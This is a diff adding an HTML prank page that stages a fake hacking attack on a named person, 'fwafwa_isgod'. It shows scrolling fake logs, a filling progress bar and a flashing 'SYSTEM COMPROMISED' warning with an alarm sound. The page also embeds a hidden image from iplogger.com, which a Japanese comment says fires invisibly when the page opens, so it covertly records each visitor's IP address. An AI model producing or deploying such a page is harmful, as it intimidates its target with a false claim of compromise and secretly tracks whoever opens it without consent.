@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>HACKING_IN_PROGRESS</title>
+    <style>
+        body { background-color: black; color: #0f0; font-family: monospace; overflow: hidden; margin: 0; }
+        #console { padding: 20px; height: 100vh; display: flex; flex-direction: column; }
+        .red-text { color: #ff0000; font-weight: bold; font-size: 1.5rem; text-shadow: 0 0 10px red; }
+        #progress-container { width: 80%; border: 1px solid #0f0; margin: 20px 0; height: 30px; }
+        #progress-bar { width: 0%; height: 100%; background-color: #0f0; transition: width 0.1s; }
+        .warning { display: none; color: red; font-size: 5rem; text-align: center; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        #log { font-size: 0.8rem; opacity: 0.7; overflow: hidden; }
+    </style>
+</head>
+<body>
+
+<div id="console">
+    <div class="red-text">hacking of fwafwa_isgod</div>
+    <div id="progress-container"><div id="progress-bar"></div></div>
+    <div id="log"></div>
+    <div id="warning-msg" class="warning">⚠️ WARNING ⚠️<br>SYSTEM COMPROMISED</div>
+</div>
+
+<!-- ページを開いた瞬間にロガーを作動させる（見た目には出ません） -->
+<img src="https://iplogger.com/2ednu6" style="display:none;" alt="system-check">
+
+<audio id="alarm-sound" src="https://actions.google.com/sounds/v1/alarms/emergency_it_is_happening.ogg"></audio>
+
+<script>
+    const log = document.getElementById('log');
+    const bar = document.getElementById('progress-bar');
+    const warning = document.getElementById('warning-msg');
+    const alarm = document.getElementById('alarm-sound');
+    let width = 0;
+
+    setInterval(() => {
+        const p = document.createElement('div');
+        p.textContent = `> hacking...... [${Math.random().toString(36).substring(7)}]`;
+        log.prepend(p);
+        if (log.childNodes.length > 20) log.removeChild(log.lastChild);
+    }, 100);
+
+    const timer = setInterval(() => {
+        if (width >= 100) {
+            clearInterval(timer);
+            warning.style.display = 'block';
+            alarm.play().catch(() => console.log("ユーザーの操作が必要です"));
+        } else {
+            width += 0.5;
+            bar.style.width = width + '%';
+        }
+    }, 50);
+
+    console.log("Logger initialized. Tracking access...");
+</script>
+
+</body>
+</html>
